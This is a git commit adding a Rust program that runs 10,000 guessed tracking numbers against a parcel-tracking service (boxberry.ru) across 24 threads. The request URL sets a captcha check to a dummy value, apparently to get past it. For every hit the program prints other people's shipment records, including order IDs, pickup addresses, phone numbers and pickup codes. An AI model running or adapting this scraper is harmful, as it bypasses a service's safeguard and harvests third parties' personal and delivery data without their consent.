c50dcf44089e9cae7a70bae2f58f8404ee120963
Sam Sheffres <ssheffres@gmail.com>
2018-06-26 06:14:59 +0700

    Initial Commit

---
+++ src/main.rs
@@ -0,0 +1,72 @@
+extern crate threadpool;
+use threadpool::ThreadPool;
+
+extern crate reqwest;
+
+extern crate clap;
+use clap::{Arg, App};
+
+extern crate serde;
+#[macro_use]
+extern crate serde_derive;
+extern crate serde_json;
+
+#[derive(Debug, Deserialize, Serialize)]
+struct Package {
+    track_id: String,
+    NameIM: String,
+    ProgramNumber: String,
+    order_id: String,
+    Weight: String,
+    delivery_type: String,
+    ForingParcel: String,
+    point_city: String,
+    point_address: String,
+    point_phone: String,
+    Code: String,
+    store_date: String,
+    delivery_date: String,
+}
+
+#[derive(Debug, Deserialize, Serialize)]
+struct TrackingCode {
+    status: i16,
+    token: Option<String>,
+    data: Option<Vec<Package>>,
+}
+
+pub static BASEURL: &str = "http://boxberry.ru/tracking.service/tracking.php?check_captcha=1&g_recaptcha_response=0";
+
+fn main() {
+    let n_workers = 24;
+    let pool = ThreadPool::new(n_workers);
+
+    for x in 0..10000 {
+        pool.execute(move|| {
+            get_package(&format!("{}", x));
+        });
+    }
+    pool.join();
+}
+
+fn get_package(number: &str) {
+    let client = reqwest::Client::new();
+    let mut request = client.get(&format!("{}&id={}{}", BASEURL, number, "A"));
+    let mut resp = request.send().unwrap();
+
+    assert!(resp.status().is_success());
+
+    //println!("{}", resp.text().unwrap());
+
+    print_packages(serde_json::from_str(&resp.text().unwrap()).unwrap());
+}
+
+fn print_packages(tracking_code: TrackingCode) {
+    if tracking_code.status == 2 {
+        let result = tracking_code.data.unwrap();
+
+        for item in result {
+            println!("{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}|{}", item.track_id, item.NameIM, item.ProgramNumber, item.order_id, item.Weight, item.delivery_type, item.ForingParcel, item.point_city, item.point_address, item.point_phone, item.Code, item.store_date, item.delivery_date);
+        }
+    }
+}
